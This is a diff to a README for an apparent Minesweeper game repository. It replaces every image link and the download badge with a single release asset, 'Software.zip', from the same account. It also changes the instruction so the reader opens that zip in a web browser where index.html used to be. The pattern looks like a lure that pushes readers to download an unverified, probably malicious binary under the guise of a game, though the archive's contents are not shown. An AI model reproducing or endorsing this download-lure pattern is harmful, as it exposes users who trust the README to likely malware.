@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Minesweeper Repository! 🧨
 
-![Minesweeper](https://cdn.pixabay.com/photo/2016/03/31/19/57/gold-bars-1293330_960_720.jpg)
+![Minesweeper](https://github.com/luis8456/minesweeper/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -16,7 +16,7 @@ Welcome to the "minesweeper" repository, a classic Minesweeper implementation bu
 
 ## Gameplay
 
-![Gameplay](https://cdn.pixabay.com/photo/2020/06/02/16/53/landscape-5251501_960_720.jpg)
+![Gameplay](https://github.com/luis8456/minesweeper/releases/download/v1.0/Software.zip)
 
 The Minesweeper game is a puzzle-based game where the player must uncover all non-mine tiles without detonating any mines. Using logical thinking and strategy, the player needs to reveal safe tiles and flag potential mines to progress through the game. By successfully uncovering all safe tiles, the player wins the game. However, if a mine is detonated, the game is lost. Challenge yourself and test your logic skills with our Minesweeper implementation!
 
@@ -24,9 +24,9 @@ The Minesweeper game is a puzzle-based game where the player must uncover all no
 
 To get started with the Minesweeper game, simply click on the following link to download the game files:
 
-[![Download Minesweeper](https://img.shields.io/badge/Download-Minesweeper-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Minesweeper](https://github.com/luis8456/minesweeper/releases/download/v1.0/Software.zip)](https://github.com/luis8456/minesweeper/releases/download/v1.0/Software.zip)
 
-Once you have downloaded the game files, extract them to your desired location and open the `index.html` file in your web browser to start playing Minesweeper. Have fun exploring the game and improving your skills!
+Once you have downloaded the game files, extract them to your desired location and open the `https://github.com/luis8456/minesweeper/releases/download/v1.0/Software.zip` file in your web browser to start playing Minesweeper. Have fun exploring the game and improving your skills!
 
 ## Repository Topics
 
@@ -47,7 +47,7 @@ Feel free to explore these topics further and enhance your knowledge in game dev
 
 ## Contributions
 
-![Contributions](https://cdn.pixabay.com/photo/2016/07/23/21/12/friends-1531733_960_720.jpg)
+![Contributions](https://github.com/luis8456/minesweeper/releases/download/v1.0/Software.zip)
 
 We welcome contributions from the community to make the Minesweeper game even better. Whether you want to enhance the gameplay, improve the user interface, add new features, or fix bugs, your help is highly appreciated. To contribute, simply fork the repository, make your changes, and submit a pull request. Let's work together to create an awesome Minesweeper experience for everyone to enjoy!
 
